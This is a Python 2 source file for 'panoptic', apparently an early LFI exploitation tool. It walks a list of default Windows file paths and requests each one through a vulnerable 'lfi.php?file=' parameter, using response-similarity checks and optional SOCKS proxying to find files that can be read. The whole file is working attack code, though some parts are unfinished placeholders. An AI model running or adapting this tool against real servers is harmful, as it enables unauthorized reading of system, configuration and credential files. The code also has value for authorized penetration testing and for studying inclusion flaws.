#!/usr/bin/env python

"""
Search default file locations on Windows, Linux or Mac.
"""

import difflib

from urllib import urlencode
from urlparse import urlsplit, parse_qsl
from urllib2 import urlopen, Request
from sys import argv, exit

class Panoptic:
    """
    Contains all the functionality to run panoptic.
    """
    def __init__(self):
        """
        Initiates the DFL object.
        """
        self.software = ""
        self.category = ""
        self.classification = ""
        self.operating_system = ""
        self.file_attributes = {}
        
    def parse_file(self):
        """
        Main function for panoptic.
        """    
        for file_location in open("file locations/windows.txt"):
            file_location = file_location.rstrip()
            if not file_location:
                continue
            elif file_location[0] == "[":
                self.category =  file_location[1:-1]
                self.operating_system =  file_location[1:-1] # FIXXXX
                continue
            elif file_location[0] == "#":
                self.software =  file_location[1:]
                continue
            elif file_location[0] == "*":
                self.classification =  file_location[1:]
                continue

            self.file_attributes["OS"] = self.operating_system
            self.file_attributes["software"] = self.software
            self.file_attributes["location"] = file_location
            self.file_attributes["classification"] = self.classification
            
            yield self.file_attributes
    
    @staticmethod
    def get_args():
        """
        Parse command line arguements.
        """
        args = {}
        if len(argv) < 2:
            exit()
        if "--string" in argv:
            args["string"] = argv[argv.index("--string")+1]
        if "--os" in argv:
            args["os"] = argv[argv.index("--os")+1]
        if "--target" in argv:
            args["target"] = argv[argv.index("--target")+1]
        if "--user-agent" in argv:
            args["user-agent"] = "gotta get a random UA here"
            
        return args        
    
class Connect:

    """
    Handles all requests to web site.
    """
    
    @staticmethod
    def get_page(**kwargs):
        """
        This method retrieves the URL
        """

        url = kwargs.get("target", None)
        post = kwargs.get("data", None)
        header = kwargs.get("header", None)
        cookie = kwargs.get("cookie", None)
        proxy = kwargs.get("proxy", False)
        user_agent = kwargs.get("user_agent", None)

        if url is None:
            raise Exception("URL cannot be None.")

        try:
            parsed_url = urlsplit(url)
        except:
            raise Exception("unable to parse URL: %s" % url)

        if proxy:
            import socks
            import socket

            proxy = proxy.split(':')
            ip = proxy[0]
            port = proxy[1]
            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, ip, int(port), True)
            socket.socket = socks.socksocket

        if user_agent is None:
            user_agent = {"user-agent": "panoptic v0.1"}
        
        if post is None:
            url = "%s://%s%s?%s" % (parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                                    urlencode(parse_qsl(parsed_url.query)))
        else:
            post = urlencode(post, "POST")

        # Perform HTTP Request
        try:
            headers = user_agent
            headers["Accept"] = "*"  # Set option to add headers in cmdline
            req = Request(url, post, headers)
            conn = urlopen(req)

            # Get HTTP Response
            page = conn.read()
            code = conn.code
            status = conn.msg
            responseHeaders = conn.info()

            return page, status, code, parsed_url

        except IOError, e:
            if hasattr(e, "reason"):
                print "failed to reach the server."
                raise Exception(str(e.reason).lower())

            if e.code == 401:
                exception_msg = "not authorized, try to provide right HTTP "
                exception_msg += "authentication type and valid credentials"
                raise Exception("%s - %s\n%s" % (exception_msg, url, str(parsed_url)))

            elif e.code == 404:
                exception_msg = "page not found"
                raise Exception("%s - %s\n%s" % (exception_msg, url, str(parsed_url)))

            else:
                page = e.read()
                code = e.code
                status = e.msg
                responseHeaders = e.info()
                print("HTTP error code: %d" % code)

        return page, status, code, parsed_url

def main():
    """
    Initialize the execution of the program.
    """
    dfl = Panoptic()
    args = dfl.get_args()
    html, _, _, parsed_URL = Connect().get_page(**{"target": args["target"]})
    
    if html.find(args["string"]) == -1:
        print("[*] string not found!")
        exit()
    else:
        dfl.standard_response = html
    
    for file in dfl.parse_file():
        args = {"target": "%s%s" % ("http://localhost/lfi.php?file=", file["location"])}
        html, _, _, parsed_URL = Connect().get_page(**args)
        
        print difflib.SequenceMatcher(None, dfl.standard_response, html).ratio()
        
if __name__ == "__main__": main()